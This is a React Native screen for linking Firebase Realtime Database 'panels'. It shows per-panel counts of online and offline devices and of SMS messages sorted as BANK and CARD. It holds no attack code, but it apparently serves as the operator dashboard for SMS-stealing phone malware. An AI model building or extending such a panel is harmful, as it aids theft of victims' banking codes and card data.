import React, { useState } from 'react';
import {
  ActivityIndicator,
  Alert,
  FlatList,
  KeyboardAvoidingView,
  Modal,
  Platform,
  ScrollView,
  StyleSheet,
  Text,
  TextInput,
  TouchableOpacity,
  View,
} from 'react-native';
import { useSafeAreaInsets } from 'react-native-safe-area-context';
import { Feather } from '@expo/vector-icons';
import { useQuery, useQueryClient } from '@tanstack/react-query';
import { useAuth } from '@/contexts/auth';
import {
  apiGetPanelConfigs,
  apiAddPanelConfig,
  apiDeletePanelConfig,
  apiTestPanelConfig,
  type PanelConfig,
} from '@/lib/api';

// ── Design tokens (match rest of app) ────────────────────────────────────────
const CYAN    = '#00e8d8';
const CYAN_85 = 'rgba(0,232,216,0.85)';
const CYAN_60 = 'rgba(0,232,216,0.6)';
const CYAN_40 = 'rgba(0,232,216,0.4)';
const CYAN_25 = 'rgba(0,232,216,0.25)';
const CYAN_15 = 'rgba(0,232,216,0.15)';
const CYAN_08 = 'rgba(0,232,216,0.08)';
const BG      = '#05090e';
const CARD    = '#0c1420';
const GREEN   = '#22c55e';
const RED     = '#f87171';
const AMBER   = '#f59e0b';
const VIOLET  = '#a78bfa';

// ── Helpers ──────────────────────────────────────────────────────────────────
function shortUrl(url: string) {
  return url.replace('https://', '').replace('http://', '');
}

// ── SubChip — small coloured dot+label pill (matches ActiveScreen stats strip) ─
function SubChip({ dot, text, color, bg, border }: {
  dot: string; text: string; color: string; bg: string; border: string;
}) {
  return (
    <View style={[subChipS.wrap, { backgroundColor: bg, borderColor: border }]}>
      <View style={[subChipS.dot, { backgroundColor: dot }]} />
      <Text style={[subChipS.label, { color }]}>{text}</Text>
    </View>
  );
}
const subChipS = StyleSheet.create({
  wrap:  { flexDirection: 'row', alignItems: 'center', gap: 4, paddingHorizontal: 7, paddingVertical: 3, borderRadius: 4, borderWidth: 1 },
  dot:   { width: 4, height: 4, borderRadius: 2, flexShrink: 0 },
  label: { fontFamily: 'Orbitron_700Bold', fontSize: 6, letterSpacing: 1 },
});

// ── Panel card ───────────────────────────────────────────────────────────────
function PanelCard({
  config,
  onTest,
  onDelete,
}: {
  config: PanelConfig;
  onTest: (id: string) => void;
  onDelete: (id: string, name: string) => void;
}) {
  const [testing, setTesting] = useState(false);
  const [testResult, setTestResult] = useState<{ ok: boolean; deviceCount?: number; error?: string } | null>(null);
  const [devOpen, setDevOpen] = useState(false);
  const [smsOpen, setSmsOpen] = useState(false);
  const { token } = useAuth();
  const s = config.stats;

  const handleTest = async () => {
    setTesting(true);
    setTestResult(null);
    const r = await apiTestPanelConfig(token!, config.id);
    setTestResult(r);
    setTesting(false);
    onTest(config.id);
  };

  return (
    <View style={[styles.card, { borderColor: config.isActive ? CYAN_25 : 'rgba(0,232,216,0.10)' }]}>
      {/* Header row */}
      <View style={styles.cardHeader}>
        <View style={[styles.cardIcon, { backgroundColor: CYAN_08, borderColor: CYAN_25 }]}>
          <Feather name="database" size={16} color={CYAN_60} />
        </View>
        <View style={{ flex: 1 }}>
          <Text style={styles.cardName} numberOfLines={1}>{config.name}</Text>
          <Text style={styles.cardUrl} numberOfLines={1}>{shortUrl(config.firebaseUrl)}</Text>
        </View>
        <View style={[
          styles.activePill,
          { backgroundColor: config.isActive ? 'rgba(0,212,170,0.12)' : 'rgba(255,107,107,0.1)',
            borderColor: config.isActive ? 'rgba(0,212,170,0.4)' : 'rgba(255,107,107,0.3)' },
        ]}>
          <View style={[styles.activeDot, { backgroundColor: config.isActive ? '#00d4aa' : '#ff6b6b' }]} />
          <Text style={[styles.activePillText, { color: config.isActive ? '#00d4aa' : '#ff6b6b' }]}>
            {config.isActive ? 'ACTIVE' : 'INACTIVE'}
          </Text>
        </View>
      </View>

      {/* ── Stat boxes ─────────────────────────────────────────────────── */}
      <View style={styles.statsRow}>

        {/* DEVICES box */}
        <TouchableOpacity
          style={[styles.statBox, {
            borderColor: devOpen ? GREEN : CYAN_25,
            backgroundColor: devOpen ? 'rgba(34,197,94,0.07)' : CYAN_08,
          }]}
          onPress={() => setDevOpen(o => !o)}
          activeOpacity={0.8}
        >
          <View style={styles.statBoxHeader}>
            <View style={styles.statBoxTitle}>
              <Feather name="monitor" size={10} color={devOpen ? GREEN : CYAN_60} />
              <Text style={[styles.statBoxLabel, { color: devOpen ? GREEN : CYAN_60 }]}>DEVICES</Text>
            </View>
            <Text style={[styles.statBoxChevron, { color: devOpen ? GREEN : CYAN_40 }]}>
              {devOpen ? '∨' : '›'}
            </Text>
          </View>
          {devOpen && (
            <View style={styles.statBoxChips}>
              <SubChip dot={GREEN}   text={`${s?.online ?? 0} ONLINE`}  color={GREEN}  bg="rgba(34,197,94,0.08)"    border="rgba(34,197,94,0.3)"    />
              <SubChip dot={RED}     text={`${s?.offline ?? 0} OFFLINE`} color={RED}    bg="rgba(248,113,113,0.08)"  border="rgba(248,113,113,0.3)"  />
              <SubChip dot={CYAN_40} text={`${s?.total ?? 0} TOTAL`}    color={CYAN_60} bg={CYAN_08} border={CYAN_25} />
            </View>
          )}
        </TouchableOpacity>

        {/* SMS box */}
        <TouchableOpacity
          style={[styles.statBox, {
            borderColor: smsOpen ? AMBER : CYAN_25,
            backgroundColor: smsOpen ? 'rgba(245,158,11,0.07)' : CYAN_08,
          }]}
          onPress={() => setSmsOpen(o => !o)}
          activeOpacity={0.8}
        >
          <View style={styles.statBoxHeader}>
            <View style={styles.statBoxTitle}>
              <Feather name="message-square" size={10} color={smsOpen ? AMBER : CYAN_60} />
              <Text style={[styles.statBoxLabel, { color: smsOpen ? AMBER : CYAN_60 }]}>SMS</Text>
            </View>
            <Text style={[styles.statBoxChevron, { color: smsOpen ? AMBER : CYAN_40 }]}>
              {smsOpen ? '∨' : '›'}
            </Text>
          </View>
          {smsOpen && (
            <View style={styles.statBoxChips}>
              <SubChip dot={AMBER}   text={`${s?.bank ?? 0} BANK`}      color={AMBER}  bg="rgba(245,158,11,0.08)"   border="rgba(245,158,11,0.3)"   />
              <SubChip dot={VIOLET}  text={`${s?.card ?? 0} CARD`}      color={VIOLET} bg="rgba(167,139,250,0.08)"  border="rgba(167,139,250,0.3)"  />
              <SubChip dot={CYAN_40} text={`${s?.smsTotal ?? 0} TOTAL`} color={CYAN_60} bg={CYAN_08} border={CYAN_25} />
            </View>
          )}
        </TouchableOpacity>

      </View>

      {/* Test result */}
      {testResult && (
        <View style={[
          styles.testResult,
          { backgroundColor: testResult.ok ? 'rgba(0,212,170,0.08)' : 'rgba(255,107,107,0.08)',
            borderColor: testResult.ok ? 'rgba(0,212,170,0.3)' : 'rgba(255,107,107,0.3)' },
        ]}>
          <Feather
            name={testResult.ok ? 'check-circle' : 'x-circle'}
            size={12}
            color={testResult.ok ? '#00d4aa' : '#ff6b6b'}
          />
          <Text style={[styles.testResultText, { color: testResult.ok ? '#00d4aa' : '#ff6b6b' }]}>
            {testResult.ok
              ? `Connected — ${testResult.deviceCount ?? 0} device${testResult.deviceCount === 1 ? '' : 's'} found`
              : (testResult.error ?? 'Connection failed')}
          </Text>
        </View>
      )}

      {/* Actions */}
      <View style={styles.cardActions}>
        <TouchableOpacity
          style={[styles.actionBtn, { borderColor: CYAN_25, backgroundColor: CYAN_08 }]}
          onPress={handleTest}
          disabled={testing}
          activeOpacity={0.7}
        >
          {testing ? (
            <ActivityIndicator size="small" color={CYAN} />
          ) : (
            <>
              <Feather name="zap" size={12} color={CYAN_60} />
              <Text style={styles.actionBtnText}>TEST</Text>
            </>
          )}
        </TouchableOpacity>
        <TouchableOpacity
          style={[styles.actionBtn, { borderColor: 'rgba(255,107,107,0.3)', backgroundColor: 'rgba(255,107,107,0.06)' }]}
          onPress={() => onDelete(config.id, config.name)}
          activeOpacity={0.7}
        >
          <Feather name="trash-2" size={12} color="#ff6b6b" />
          <Text style={[styles.actionBtnText, { color: '#ff6b6b' }]}>REMOVE</Text>
        </TouchableOpacity>
      </View>
    </View>
  );
}

// ── Add Panel Modal ───────────────────────────────────────────────────────────
function AddPanelModal({
  visible,
  onClose,
  onAdd,
}: {
  visible: boolean;
  onClose: () => void;
  onAdd: (name: string, url: string, secret: string) => Promise<{ deviceCount: number }>;
}) {
  const [name, setName]         = useState('');
  const [url, setUrl]           = useState('');
  const [secret, setSecret]     = useState('');
  const [loading, setLoading]   = useState(false);
  const [error, setError]       = useState<string | null>(null);
  const [success, setSuccess]   = useState<{ deviceCount: number } | null>(null);

  const reset = () => { setName(''); setUrl(''); setSecret(''); setError(null); setSuccess(null); };

  const handleClose = () => { reset(); onClose(); };

  const handleAdd = async () => {
    if (!name.trim())   { setError('Panel name is required.'); return; }
    if (!url.trim())    { setError('Firebase URL is required.'); return; }
    if (!secret.trim()) { setError('Firebase secret / API key is required.'); return; }
    if (!url.includes('firebaseio.com') && !url.includes('firebasedatabase.app')) {
      setError('URL must be a valid Firebase Realtime Database URL.');
      return;
    }
    setError(null);
    setSuccess(null);
    setLoading(true);
    try {
      const result = await onAdd(name.trim(), url.trim(), secret.trim());
      setSuccess(result);
      // Auto-close after 1.8 s so user sees the confirmation
      setTimeout(() => { reset(); onClose(); }, 1800);
    } catch (e) {
      setError(e instanceof Error ? e.message : 'Failed to add panel.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <Modal visible={visible} animationType="slide" transparent onRequestClose={handleClose}>
      <KeyboardAvoidingView
        style={styles.modalOverlay}
        behavior={Platform.OS === 'ios' ? 'padding' : 'height'}
      >
        <TouchableOpacity style={StyleSheet.absoluteFill} onPress={handleClose} activeOpacity={1} />
        <View style={[styles.modalSheet, { backgroundColor: '#080d14' }]}>
          {/* Handle */}
          <View style={styles.sheetHandle} />

          <Text style={styles.sheetTitle}>ADD FIREBASE PANEL</Text>
          <Text style={styles.sheetSub}>
            Connection is verified before saving — credentials are tested live.
          </Text>

          <ScrollView showsVerticalScrollIndicator={false} keyboardShouldPersistTaps="handled">
            <Field
              label="PANEL NAME"
              icon="tag"
              value={name}
              onChange={setName}
              placeholder="e.g. Production DB"
            />
            <Field
              label="FIREBASE URL"
              icon="link"
              value={url}
              onChange={setUrl}
              placeholder="https://your-app.firebaseio.com"
              keyboardType="url"
              autoCapitalize="none"
            />
            <Field
              label="SECRET / API KEY"
              icon="key"
              value={secret}
              onChange={setSecret}
              placeholder="Firebase database secret"
              secure
            />

            {/* Loading state — show what's happening */}
            {loading && (
              <View style={styles.connectingBox}>
                <ActivityIndicator size="small" color={CYAN} />
                <Text style={styles.connectingText}>CONNECTING TO FIREBASE...</Text>
              </View>
            )}

            {/* Error */}
            {!loading && error && (
              <View style={styles.errorBox}>
                <Feather name="alert-circle" size={12} color="#ff6b6b" />
                <Text style={styles.errorText}>{error}</Text>
              </View>
            )}

            {/* Success */}
            {!loading && success && (
              <View style={styles.successBox}>
                <Feather name="check-circle" size={14} color="#00d4aa" />
                <Text style={styles.successText}>
                  Panel connected — {success.deviceCount} device{success.deviceCount !== 1 ? 's' : ''} found
                </Text>
              </View>
            )}

            {!success && (
              <TouchableOpacity
                style={[styles.addBtn, loading && { opacity: 0.6 }]}
                onPress={handleAdd}
                disabled={loading}
                activeOpacity={0.8}
              >
                {loading ? (
                  <ActivityIndicator size="small" color="#001520" />
                ) : (
                  <>
                    <Feather name="plus" size={16} color="#001520" />
                    <Text style={styles.addBtnText}>ADD PANEL</Text>
                  </>
                )}
              </TouchableOpacity>
            )}

            {!success && (
              <TouchableOpacity style={styles.cancelBtn} onPress={handleClose} activeOpacity={0.7}>
                <Text style={styles.cancelBtnText}>Cancel</Text>
              </TouchableOpacity>
            )}
          </ScrollView>
        </View>
      </KeyboardAvoidingView>
    </Modal>
  );
}

function Field({
  label, icon, value, onChange, placeholder, secure, keyboardType, autoCapitalize,
}: {
  label: string;
  icon: React.ComponentProps<typeof Feather>['name'];
  value: string;
  onChange: (v: string) => void;
  placeholder?: string;
  secure?: boolean;
  keyboardType?: TextInput['props']['keyboardType'];
  autoCapitalize?: TextInput['props']['autoCapitalize'];
}) {
  const [focused, setFocused] = useState(false);
  return (
    <View style={{ marginBottom: 14 }}>
      <View style={styles.fieldLabel}>
        <Feather name={icon} size={11} color={CYAN_60} />
        <Text style={styles.fieldLabelText}>{label}</Text>
      </View>
      <TextInput
        style={[
          styles.fieldInput,
          { borderColor: focused ? CYAN_40 : CYAN_15, backgroundColor: focused ? 'rgba(0,40,70,0.5)' : CARD },
        ]}
        value={value}
        onChangeText={onChange}
        placeholder={placeholder}
        placeholderTextColor={CYAN_25}
        secureTextEntry={secure}
        keyboardType={keyboardType}
        autoCapitalize={autoCapitalize ?? 'none'}
        autoCorrect={false}
        onFocus={() => setFocused(true)}
        onBlur={() => setFocused(false)}
      />
    </View>
  );
}

// ── Main screen ───────────────────────────────────────────────────────────────
export function PanelLinkedScreen() {
  const insets     = useSafeAreaInsets();
  const { token }  = useAuth();
  const qc         = useQueryClient();
  const [showAdd, setShowAdd] = useState(false);

  const { data: configs = [], isLoading, isFetching, error, refetch } = useQuery({
    queryKey: ['panel-configs', token],
    queryFn: () => apiGetPanelConfigs(token!),
    enabled: !!token,
    staleTime: 30_000,
  });

  const handleAdd = async (name: string, url: string, secret: string) => {
    const { deviceCount } = await apiAddPanelConfig(token!, name, url, secret);
    await qc.invalidateQueries({ queryKey: ['panel-configs'] });
    await qc.invalidateQueries({ queryKey: ['devices'] });
    return { deviceCount };
  };

  const handleDelete = (id: string, name: string) => {
    Alert.alert(
      'Remove Panel',
      `Remove "${name}"? All device data from this panel will stop syncing.`,
      [
        { text: 'Cancel', style: 'cancel' },
        {
          text: 'Remove',
          style: 'destructive',
          onPress: async () => {
            try {
              await apiDeletePanelConfig(token!, id);
              await qc.invalidateQueries({ queryKey: ['panel-configs'] });
              await qc.invalidateQueries({ queryKey: ['devices'] });
            } catch {
              Alert.alert('Error', 'Failed to remove panel. Please try again.');
            }
          },
        },
      ],
    );
  };

  return (
    <View style={[styles.root, { backgroundColor: BG }]}>
      {/* Sub-header */}
      <View style={styles.subHeader}>
        <View>
          <Text style={styles.pageTitle}>PANEL LINKED</Text>
          {!isLoading && (
            <Text style={styles.pageSub}>
              {configs.length} panel{configs.length !== 1 ? 's' : ''} connected
            </Text>
          )}
        </View>
        <View style={{ flexDirection: 'row', alignItems: 'center', gap: 8 }}>
          {isFetching && !isLoading && <ActivityIndicator size="small" color={CYAN} />}
          <TouchableOpacity
            style={[styles.addIconBtn, { borderColor: CYAN_25, backgroundColor: CYAN_08 }]}
            onPress={() => setShowAdd(true)}
            activeOpacity={0.7}
          >
            <Feather name="plus" size={16} color={CYAN} />
          </TouchableOpacity>
        </View>
      </View>

      {isLoading ? (
        <View style={styles.center}>
          <ActivityIndicator size="large" color={CYAN} />
          <Text style={styles.loadingText}>LOADING PANELS...</Text>
        </View>
      ) : error ? (
        <View style={styles.center}>
          <Feather name="wifi-off" size={40} color="#ff6b6b" />
          <Text style={styles.errorTitle}>FAILED TO LOAD</Text>
          <TouchableOpacity onPress={() => refetch()} style={styles.retryBtn}>
            <Text style={styles.retryText}>RETRY</Text>
          </TouchableOpacity>
        </View>
      ) : (
        <FlatList
          data={configs}
          keyExtractor={(c) => c.id}
          renderItem={({ item }) => (
            <PanelCard
              config={item}
              onTest={() => {}}
              onDelete={handleDelete}
            />
          )}
          contentContainerStyle={[styles.list, { paddingBottom: insets.bottom + 100 }]}
          showsVerticalScrollIndicator={false}
          refreshing={isFetching}
          onRefresh={refetch}
          ListEmptyComponent={
            <View style={styles.empty}>
              <View style={[styles.emptyIcon, { backgroundColor: CYAN_08, borderColor: CYAN_15 }]}>
                <Feather name="link-2" size={32} color={CYAN_40} />
              </View>
              <Text style={styles.emptyTitle}>No panels connected</Text>
              <Text style={styles.emptyBody}>
                Tap the + button to connect your Firebase Realtime Database and start receiving device data.
              </Text>
              <TouchableOpacity
                style={styles.emptyAddBtn}
                onPress={() => setShowAdd(true)}
                activeOpacity={0.8}
              >
                <Feather name="plus" size={14} color="#001520" />
                <Text style={styles.emptyAddBtnText}>ADD YOUR FIRST PANEL</Text>
              </TouchableOpacity>
            </View>
          }
        />
      )}

      {/* Floating add button */}
      {configs.length > 0 && (
        <TouchableOpacity
          style={[styles.fab, { bottom: insets.bottom + 20, backgroundColor: CYAN }]}
          onPress={() => setShowAdd(true)}
          activeOpacity={0.85}
        >
          <Feather name="plus" size={22} color="#001520" />
        </TouchableOpacity>
      )}

      <AddPanelModal
        visible={showAdd}
        onClose={() => setShowAdd(false)}
        onAdd={handleAdd}
      />
    </View>
  );
}

// ── Styles ────────────────────────────────────────────────────────────────────
const styles = StyleSheet.create({
  root:      { flex: 1 },
  subHeader: {
    flexDirection: 'row', alignItems: 'flex-end', justifyContent: 'space-between',
    paddingHorizontal: 20, paddingTop: 14, paddingBottom: 12,
    borderBottomWidth: 1, borderBottomColor: CYAN_25,
    backgroundColor: '#080d14',
  },
  pageTitle: { fontSize: 18, fontFamily: 'Orbitron_700Bold', letterSpacing: 4, color: CYAN },
  pageSub:   { fontSize: 11, letterSpacing: 1, marginTop: 3, fontFamily: 'ShareTechMono_400Regular', color: CYAN_40 },
  addIconBtn:{ width: 34, height: 34, borderRadius: 8, borderWidth: 1, alignItems: 'center', justifyContent: 'center' },
  list:      { padding: 14, gap: 12 },
  center:    { flex: 1, alignItems: 'center', justifyContent: 'center', gap: 12, padding: 24 },
  loadingText: { fontSize: 11, letterSpacing: 4, fontFamily: 'Exo2_500Medium', color: CYAN_40 },
  errorTitle:  { fontSize: 14, fontFamily: 'Orbitron_700Bold', letterSpacing: 3, color: '#ff6b6b' },
  retryBtn:    { paddingHorizontal: 20, paddingVertical: 8, borderRadius: 6, borderWidth: 1, borderColor: CYAN_25 },
  retryText:   { fontSize: 11, letterSpacing: 2, fontFamily: 'Exo2_700Bold', color: CYAN },

  // Cards
  card: {
    borderWidth: 1, borderRadius: 10,
    backgroundColor: CARD, padding: 14, gap: 12,
  },
  cardHeader: { flexDirection: 'row', alignItems: 'center', gap: 10 },
  cardIcon: { width: 38, height: 38, borderRadius: 8, borderWidth: 1, alignItems: 'center', justifyContent: 'center' },
  cardName:   { fontSize: 14, fontFamily: 'Exo2_600SemiBold', color: CYAN_85, marginBottom: 2 },
  cardUrl:    { fontSize: 10, fontFamily: 'ShareTechMono_400Regular', color: CYAN_40 },
  activePill: { flexDirection: 'row', alignItems: 'center', gap: 5, paddingHorizontal: 8, paddingVertical: 4, borderRadius: 20, borderWidth: 1 },
  activeDot:  { width: 5, height: 5, borderRadius: 3 },
  activePillText: { fontSize: 8, fontFamily: 'Orbitron_700Bold', letterSpacing: 1 },

  // Stat boxes
  statsRow:      { flexDirection: 'row', gap: 8 },
  statBox:       { flex: 1, borderRadius: 8, borderWidth: 1, padding: 9, gap: 7 },
  statBoxHeader: { flexDirection: 'row', alignItems: 'center', justifyContent: 'space-between' },
  statBoxTitle:  { flexDirection: 'row', alignItems: 'center', gap: 5 },
  statBoxLabel:  { fontFamily: 'Orbitron_700Bold', fontSize: 7, letterSpacing: 1.5 },
  statBoxChevron:{ fontFamily: 'ShareTechMono_400Regular', fontSize: 11, lineHeight: 13 },
  statBoxChips:  { gap: 4 },

  testResult: { flexDirection: 'row', alignItems: 'center', gap: 8, padding: 8, borderRadius: 6, borderWidth: 1 },
  testResultText: { fontSize: 11, fontFamily: 'ShareTechMono_400Regular', flex: 1 },
  cardActions:{ flexDirection: 'row', gap: 8 },
  actionBtn:  { flex: 1, flexDirection: 'row', alignItems: 'center', justifyContent: 'center', gap: 6, paddingVertical: 8, borderRadius: 6, borderWidth: 1 },
  actionBtnText: { fontSize: 10, fontFamily: 'Orbitron_700Bold', letterSpacing: 2, color: CYAN_60 },

  // Empty state
  empty:       { alignItems: 'center', paddingTop: 60, gap: 14, paddingHorizontal: 24 },
  emptyIcon:   { width: 72, height: 72, borderRadius: 20, borderWidth: 1, alignItems: 'center', justifyContent: 'center', marginBottom: 4 },
  emptyTitle:  { fontSize: 16, fontFamily: 'Exo2_600SemiBold', color: CYAN_60 },
  emptyBody:   { fontSize: 12, fontFamily: 'Exo2_400Regular', color: CYAN_40, textAlign: 'center', lineHeight: 18 },
  emptyAddBtn: { flexDirection: 'row', alignItems: 'center', gap: 8, backgroundColor: CYAN, paddingHorizontal: 20, paddingVertical: 12, borderRadius: 8, marginTop: 8 },
  emptyAddBtnText: { fontSize: 12, fontFamily: 'Orbitron_700Bold', letterSpacing: 2, color: '#001520' },

  // FAB
  fab: { position: 'absolute', right: 20, width: 52, height: 52, borderRadius: 26, alignItems: 'center', justifyContent: 'center', elevation: 6, shadowColor: CYAN, shadowOffset: { width: 0, height: 0 }, shadowOpacity: 0.4, shadowRadius: 12 },

  // Modal
  modalOverlay: { flex: 1, justifyContent: 'flex-end' },
  modalSheet:   { borderTopLeftRadius: 20, borderTopRightRadius: 20, paddingHorizontal: 20, paddingBottom: 32, paddingTop: 12, borderTopWidth: 1, borderTopColor: CYAN_25, maxHeight: '90%' },
  sheetHandle:  { width: 36, height: 4, borderRadius: 2, backgroundColor: CYAN_25, alignSelf: 'center', marginBottom: 20 },
  sheetTitle:   { fontSize: 16, fontFamily: 'Orbitron_700Bold', letterSpacing: 3, color: CYAN, marginBottom: 6 },
  sheetSub:     { fontSize: 12, fontFamily: 'Exo2_400Regular', color: CYAN_40, marginBottom: 24, lineHeight: 18 },

  // Field
  fieldLabel:     { flexDirection: 'row', alignItems: 'center', gap: 6, marginBottom: 6 },
  fieldLabelText: { fontSize: 10, fontFamily: 'ShareTechMono_400Regular', letterSpacing: 3, color: CYAN_60 },
  fieldInput:     { borderWidth: 1, borderRadius: 8, paddingHorizontal: 12, paddingVertical: 10, fontSize: 13, fontFamily: 'ShareTechMono_400Regular', color: CYAN_85 },
  errorBox:       { flexDirection: 'row', alignItems: 'center', gap: 8, padding: 10, backgroundColor: 'rgba(255,107,107,0.08)', borderWidth: 1, borderColor: 'rgba(255,107,107,0.3)', borderRadius: 8, marginBottom: 14 },
  errorText:      { fontSize: 12, fontFamily: 'Exo2_400Regular', color: '#ff6b6b', flex: 1 },
  addBtn:         { flexDirection: 'row', alignItems: 'center', justifyContent: 'center', gap: 8, backgroundColor: CYAN, paddingVertical: 14, borderRadius: 10, marginTop: 4, marginBottom: 8 },
  addBtnText:     { fontSize: 14, fontFamily: 'Orbitron_700Bold', letterSpacing: 3, color: '#001520' },
  cancelBtn:      { alignItems: 'center', paddingVertical: 12 },
  cancelBtnText:  { fontSize: 13, fontFamily: 'Exo2_400Regular', color: CYAN_40 },

  // Connecting / success feedback
  connectingBox:  { flexDirection: 'row', alignItems: 'center', gap: 10, padding: 12, backgroundColor: 'rgba(0,232,216,0.06)', borderWidth: 1, borderColor: CYAN_25, borderRadius: 8, marginBottom: 14 },
  connectingText: { fontSize: 11, fontFamily: 'ShareTechMono_400Regular', letterSpacing: 2, color: CYAN_60, flex: 1 },
  successBox:     { flexDirection: 'row', alignItems: 'center', gap: 10, padding: 12, backgroundColor: 'rgba(0,212,170,0.08)', borderWidth: 1, borderColor: 'rgba(0,212,170,0.35)', borderRadius: 8, marginBottom: 14 },
  successText:    { fontSize: 12, fontFamily: 'Exo2_600SemiBold', color: '#00d4aa', flex: 1 },
});
